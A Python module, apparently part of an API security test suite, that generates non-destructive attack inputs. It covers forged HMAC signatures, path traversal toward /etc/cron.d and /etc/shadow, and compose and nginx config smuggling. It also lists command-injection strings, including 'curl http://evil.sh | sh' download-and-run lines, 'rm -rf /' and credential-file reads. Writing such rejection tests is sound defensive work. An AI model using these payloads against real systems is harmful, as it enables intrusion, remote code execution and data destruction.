"""Generator vektor serangan Wave 2 (api-w2 §2.1, §2.4, §2.5) — pure, zero I/O.

Semua vektor NON-DESTRUKTIF: tidak ada command yang dieksekusi di sisi test —
kita hanya menguji apakah gerbang API menolak payload sebelum dispatch.
"""

from __future__ import annotations

import secrets
from typing import Any

SAFE_REJECTION_STATUSES = frozenset({400, 401, 403, 404, 409, 422})


def expected_rejection(status: int) -> bool:
    """True bila status adalah penolakan rapi sesuai tabel error api-w2 §2."""
    return status in SAFE_REJECTION_STATUSES


def no_internal_leak(body_text: str) -> bool:
    """Bukti error tidak membocorkan detail internal (sql/panic/stack/backtrace)."""
    lowered = body_text.lower()
    return not any(
        marker in lowered
        for marker in ("sql", "panic", "backtrace", "stack trace", "postgres:", "tokio::")
    )


# ---------------------------------------------------------------------------
# 1. Enrollment token replay / expired / fuzz (§2.1)
# ---------------------------------------------------------------------------
def random_enrollment_token() -> str:
    return secrets.token_hex(32)  # bentuk valid hex-64, isi palsu


def malformed_enrollment_tokens() -> tuple[str, ...]:
    return (
        "",
        "deadbeef",
        "z" * 64,
        " " * 64,
        "ą"*64,
        "../../etc/passwd",
        "a" * 4096,
        "0x" + "f" * 62,
    )


# ---------------------------------------------------------------------------
# 2. HMAC forgery / replay (§2.1 — kanonis {ts}\n{METHOD}\n{path}\n{sha256(body)})
# ---------------------------------------------------------------------------
def forge_signature_with_wrong_secret(secret_hex: str, ts: int, method: str, path: str, body: bytes) -> str:
    """Signature dihitung dengan secret LAIN (mis. `00`*32)."""
    from infrastructure.w2_soc_client import sign_agent_request

    wrong_secret = "00" * 32 if wrong_secret_is_valid_hex(secret_hex) else "11" * 32
    return sign_agent_request(wrong_secret, ts, method, path, body)


def wrong_secret_is_valid_hex(secret_hex: str) -> bool:
    try:
        bytes.fromhex(secret_hex)
        return True
    except ValueError:
        return False


def stale_and_future_timestamps(now: int) -> dict[str, int]:
    """Di luar window anti-replay ±30 s."""
    return {"stale_1h": now - 3600, "future_1h": now + 3600, "stale_31s": now - 31}


# ---------------------------------------------------------------------------
# 3. Path traversal pada stack `compose.yaml` (§2.4) — target ../../etc/cron.d
# ---------------------------------------------------------------------------
def traversal_stack_names() -> tuple[str, ...]:
    return (
        "../../etc/cron.d",
        "/etc/cron.d",
        "stack/../../etc/cron.d",
        "....//....//etc/cron.d",
        "ok%2F..%2F..%2Fetc%2Fcron.d",  # encoding dua kali
        "stack\x2e\x2e/cron",
    )


def traversal_working_dirs() -> tuple[str, ...]:
    return (
        "/opt/../../etc/cron.d",
        "/opt/stacks/../../../etc/cron.d",
        "/opt/stacks/..\\..\\etc\\cron.d",
        "~/../../etc/cron.d",
        "/opt/stacks/.\./cron",
        "/opt/stacks/x\x00/etc/cron.d",
    )


def traversal_compose_payloads() -> dict[str, str]:
    """compose_content yang mencoba menyelundup path via key terlarang/bind host."""
    return {
        "include_top_level": "include:\n  - /etc/cron.d/evil\nservices:\n  web:\n    image: nginx:1\n",
        "include_relative": "include:\n  - ../../etc/cron.d/evil\nservices:\n  web:\n    image: nginx:1\n",
        "env_file_host_path": (
            "services:\n  web:\n    image: nginx:1\n    env_file:\n      - /etc/shadow\n"
        ),
        "bind_etc": (
            "services:\n  web:\n    image: nginx:1\n    volumes:\n      - /etc/cron.d:/host-cron\n"
        ),
    }


# ---------------------------------------------------------------------------
# 4. Command injection pada nginx upstream/server_name & dispatch (§2.5)
# ---------------------------------------------------------------------------
def nginx_server_name_injections() -> tuple[str, ...]:
    return (
        "app.example.com; include /etc/shadow",
        "app.example.com; rm -rf /",
        "`id`",
        "$(whoami)",
        "app.example.com && curl http://evil.sh/x.sh | sh",
        "app|wget http://evil -O /etc/cron.d/pwn",
        "app.example.com\n  include ../../etc/cron.d/*;",
        "app\x00.example.com",
        "app; DROP TABLE nginx_virtual_hosts; --",
    )


def nginx_upstream_injection_configs() -> dict[str, str]:
    """config_content dengan upstream/`proxy_pass` menyelundup directive/shell."""
    return {
        "upstream_inject_semicolon": (
            "upstream app {\n"
            "  server 127.0.0.1:3000; include ../../etc/cron.d/*;\n"
            "}\n"
            "server {\n  listen 80;\n  server_name app.example.com;\n"
            "  location / {\n    proxy_pass http://app;\n  }\n}\n"
        ),
        "proxy_pass_embedded_command": (
            "server {\n  listen 80;\n  server_name app.example.com;\n"
            "  location / {\n    proxy_pass http://`id`.evil.sh;\n  }\n}\n"
        ),
        "include_relative": (
            "server {\n  listen 80;\n  server_name app.example.com;\n"
            "  include snippets/../../etc/shadow;\n}\n"
        ),
        "unbalanced_close_exec": (
            "server {\n  listen 80;\n  server_name app.example.com;\n"
            "  location / {\n    proxy_pass http://app;\n  }\n"
            "  # } \n  ; touch /tmp/pwned\n"
        ),
    }


def dispatch_command_injections() -> tuple[str, ...]:
    return (
        "up; cat /etc/shadow",
        "up && curl http://evil.sh | sh",
        "up$(touch /tmp/pwned)",
        "up `id`",
        "up\nrestart",
        "down | tee /etc/cron.d/pwn",
        "test_reload; reboot",
        "up; DROP TABLE compose_stacks; --",
        "",
    )
